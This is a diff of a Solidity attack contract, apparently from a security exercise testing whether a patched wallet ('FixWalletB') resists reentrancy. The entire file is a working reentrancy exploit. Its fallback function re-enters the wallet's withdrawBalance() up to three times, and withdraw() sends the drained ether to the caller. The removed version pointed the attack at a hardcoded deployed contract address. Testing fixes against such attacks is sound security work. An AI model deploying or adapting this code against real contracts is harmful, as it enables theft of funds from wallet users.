@@ -1,35 +1,31 @@
 pragma solidity ^0.5.8;
 
-import "./VulnerableWallet.sol";
+import "./FixWalletB.sol";
 
 
-contract Malicious {
-    address payable public owner;
-    uint public value;
+contract MaliciousWallet {
+    uint private iterations = 0;
+    uint constant private MAX_ITERATION = 3;
     Wallet wallet;
-    
-    constructor() public {
-        owner = msg.sender;
-        wallet = Wallet(0x7a8e718B35A080fd6b4596d742086f0C9928b447); 
+
+    constructor(address walletAddress) public {
+        wallet = Wallet(walletAddress);
     }
-    
-    function deposit() public payable {
-        wallet.deposit.value(msg.value);
+
+    function deposit() external payable {
+        wallet.deposit.value(msg.value)();
     }
-    
+
     function withdraw() external payable {
+        iterations = 0;
         wallet.withdrawBalance();
+        msg.sender.transfer(address(this).balance);
     }
-    
+
     function() external payable{
-        owner.transfer(msg.value);
-        if (value < 2) {
-            value += 1;
+        if (iterations < MAX_ITERATION - 1) {
+            iterations += 1;
             wallet.withdrawBalance();
         }
-    }
-
-    function get_balance() view external returns (uint256) {
-        return address(this).balance;
     }
 }
